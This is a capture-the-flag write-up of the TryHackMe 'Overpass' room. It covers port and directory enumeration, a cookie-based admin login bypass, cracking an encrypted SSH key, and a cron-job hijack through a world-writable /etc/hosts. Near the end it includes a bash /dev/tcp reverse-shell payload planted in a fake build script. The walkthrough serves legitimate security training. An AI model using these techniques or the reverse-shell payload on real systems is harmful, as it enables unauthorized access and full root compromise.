---
title: /thm_overpass
date: 2022-02-19 18:00:00 +/-3000
categories: [CTF, TryHackMe]
tags: [ctf]     # TAG names should always be lowercase
comments: true
img_path: \assets\img\overpass
pin: true
#image:
  #src: /badge.png
  #width: 1000   # in pixels
  #height: 400   # in pixels
  #alt: image alternative text
---

![badge](/badge.png){: w="700" h="400" }
>[**Room link**](https://tryhackme.com/room/overpass){:target="_blank"}
{: .prompt-info }

# **Tasks**

* ## Hack the machine and get the flag in user.txt.
* ## Escalate your privileges and get the flag in root.txt.

# **Enumeration**

## **Nmap**

```bash
nmap -sT -sV -sC $ip
```

>### Let's start with a basic portscan using ``nmap``.

![nmap](/nmap.png){: w="700" h="400" }
>_The initial scan shows TCP ports `22` and ``80`` are **OPEN**. Now let's start enumerating the web application._

>Remeber to ``export ip=machine_ip``.
{: .prompt-warning }

---

## **Gobuster**

```bash
gobuster dir -u $ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

>### I'll use ``gobuster`` to enumerate files and directories.

![gobuster](/gobuster.png){: w="700" h="400" :}

---

### **`/`**

![overpass01](/overpass01.png){: w="700" h="400" :}

>### odd comment in source code: \<!\--Yeah right, just because the Romans used it doesn't make it military grade, change this?-\->

---

### **`/aboutus`**

![overpass02](/overpass02.png){: w="700" h="400" :}

>### Potential valid usernames.

---

### **`/downloads/src/overpass.go`**

![overpass03](/overpass03.png){: w="700" h="400" :}

>### Looking at source code there’s not anything we can do.

---

### **`/admin/`**

![overpass-login](/overpass-login.png){: w="700" h="400" :}

>### Looking at the source code we can see a odd file named login.js.

---

### **``login.js``**

```javascript
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

>### The function ``login()`` is a simple if else statement. Basically, if the response is equal to “Incorrect Crentials” it will display a message saying “Incorrect Credentials”. Otherwise, it will set a cookie named ``SessionToken`` to the returned ``statusOrCookie`` and redirect the user to /admin. However, we can bypass the authentication check by just creating a cookie named ``SessionToken`` and set equal to anything.

---

# **Exploitation**

## **Curl**

```bash
curl $ip/admin/ -b "SessionToken=anything"
```

![curl](/curl.png){: w="700" h="400" :}

>### Then we get a ``SSH Private Key``. Based on the message we see it was created for ``james`` and has a section that says ``ENCRYPTED``, this means we’ll probably need to crack it.

---

## **Hashcat**

```bash
ssh2john.py id_rsa > id_rsa_hash
hashcat -a 0 -m 22931 id_rsa_hash /usr/share/wordlists/rockyou.txt
```

>### Let's use `ssh2john` and `hashcat` to crack the hash.

![hashcat](/hashcat.png){: w="700" h="400" :}

> **You can also use ``john`` to crack the hash.** 
{: .prompt-info }

---

## **Pwncat-cs**

```bash
chmod 600 id_rsa
pwncat-cs -i ./id_rsa james@$ip
```

>### Let's use ``chmod`` and ``pwncat-cs`` to access the machine.

![cat](/cat.png){: w="700" h="400" :}
_We also see a todo list. Hmm.. something about a build script._
> **Read more about pwncat-cs** [**here**.](https://github.com/calebstewart/pwncat){:target="_blank"}
{: .prompt-info }

---

# **Post Exploitation**

```bash
chmod +x linpeas.sh; ./linpeas.sh | tee peas.out
```

>### I'll use ``pwncat-cs`` to upload `linpeas.sh`. Then make the linpeas script executable, run and pipe it to tee to save the output. Use ``less -r peas.out`` to read output file.

![linpeas](/linpeas.png){: w="700" h="400" :}

> **Read more about upload files** [**here**](https://gtfobins.github.io/#+file%20upload){:target="_blank"}.
{: .prompt-info }

---

## **Cronjob**

![cronjob](/cronjob.png){: w="700" h="400" :}

>### We spot a cronjob that’s trying to download a shell script using curl from overpass.thm then pipes it to bash. To exploit this we’d need to somehow redirect the domain to our IP. 

---

## **/etc/hosts**

![hosts](/hosts.png){: w="700" h="400" :}

>### Luckily, ``/etc/hosts`` is ``world-writable``.

![hosts2](/hosts2.png){: w="700" h="400" :}

>### Then just replace "127.0.0.1" with your and ``curl`` will download from our IP.

---

# **Privelege Escalation**

~~~~bash
mkdir -p downloads/src
echo "bash -c 'exec bash -i &>/dev/tcp/your_thm_ip/some_port_to_listen_on <&1'" > downloads/src/buildscript.sh
pwncat-cs -lp some_port_to_listen_on -m linux
sudo python3 -m http.server 80
~~~~

>### Your fake buildscript.sh can do really whatever you want as it’s being piped to bash, i'll create a simple reverse shell. Then i'll use ``pwncat-cs`` to listen and open a simple http.server with ``python3`` in that order.

![root](/root.png){: w="700" h="400" :}

> **You can also use `netcat` to listen.**
{: .prompt-info }